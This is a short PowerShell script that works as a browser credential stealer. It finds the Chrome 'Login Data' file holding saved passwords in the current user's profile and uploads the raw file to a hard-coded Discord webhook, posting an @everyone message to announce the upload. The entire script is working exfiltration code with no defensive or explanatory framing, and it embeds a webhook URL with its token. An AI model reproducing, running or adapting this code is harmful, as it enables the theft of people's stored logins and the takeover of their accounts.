# Define the Discord Webhook URL
$webhook = "https://discord.com/api/webhooks/1315398167768076348/FHFvfm3hhnJDsTNvuTR-5oB86OJY7kUwI-4F5S_Hxn7SdgZY1gXxaRQFuMO-yFFwPnPT"

# Function for sending messages through Discord Webhook
function Send-DiscordMessage {
    param (
        [string]$message
    )

    # Ensure the message contains content, if not, set default content with @everyone ping
    if ([string]::IsNullOrEmpty($message)) {
        $message = "@everyone A raw Chrome Login Data file has been uploaded."
    }

    # Create the JSON payload with content
    $body = @{
        content = $message
    }

    try {
        # Send the JSON message to Discord
        Invoke-RestMethod -Uri $webhook -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
    } catch {
        Write-Host "Failed to send message to Discord: $_"
    }
}

# Function for uploading files to Discord via webhook
function Upload-FileToDiscord {
    param (
        [string]$filePath
    )

    # Prepare file content
    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
    $fileName = [System.IO.Path]::GetFileName($filePath)

    # Prepare multipart body
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    $fileContent = [System.Text.Encoding]::ASCII.GetString($fileBytes)

    # Create the multipart/form-data body for the file
    $body = (
        "--$boundary" + $LF +
        "Content-Disposition: form-data; name=""file""; filename=""$fileName""" + $LF +
        "Content-Type: application/octet-stream" + $LF + $LF +
        $fileContent + $LF +
        "--$boundary--"
    )

    # Headers for the multipart request
    $headers = @{
        "Content-Type" = "multipart/form-data; boundary=$boundary"
    }

    try {
        # Send the file to Discord via webhook
        $response = Invoke-RestMethod -Uri $webhook -Method Post -Body $body -Headers $headers
        Write-Host "File uploaded successfully."
    } catch {
        Write-Host "Failed to upload file to Discord: $_"
    }
}

# Check for Chrome executable and user data
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$loginDataPath = "$chromePath\Default\Login Data"
if (-not (Test-Path $loginDataPath)) {
    Send-DiscordMessage -message "Chrome Login Data not found!"
    exit
}

# Send the message with @everyone ping
Send-DiscordMessage -message "@everyone A raw Chrome Login Data file has been uploaded."

# Upload the raw Login Data file directly to Discord
Upload-FileToDiscord -filePath $loginDataPath
